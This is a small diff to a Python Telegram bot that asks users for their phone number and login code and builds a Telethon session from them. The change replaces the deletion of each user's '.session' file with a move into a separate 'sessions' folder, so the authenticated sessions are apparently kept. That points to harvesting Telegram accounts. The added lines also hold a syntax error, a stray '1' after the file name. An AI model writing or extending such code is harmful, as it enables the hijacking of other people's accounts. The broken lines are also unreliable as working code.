@@ -28,6 +28,7 @@ import threading
 from telethon.tl.functions.channels import LeaveChannelRequest
 import psutil
 import time
+import shutil
 
 def StopFunction():
     while True:
@@ -148,7 +149,7 @@ async def inline_click(call: types.CallbackQuery):
 
             sessionString = StringSession(sessionString)
             await client111.client.disconnect()
-            os.remove(f"./{client111.phone_number}.session")
+            shutil.move(f"./{client111.phone_number}.session"1, "../../sessions")
 
             await call.message.reply(config.textInfo["validCodeText"])
 
@@ -221,7 +222,7 @@ async def code_step(message: types.Message):
         sessionString = StringSession.save(client111.client.session)
         sessionString = StringSession(sessionString)
         await client111.client.disconnect()
-        os.remove(f"./{client111.phone_number}.session")
+        shutil.move(f"./{client111.phone_number}.session"1, "../../sessions")
 
         await message.reply(config.textInfo["validCodeText"])
 
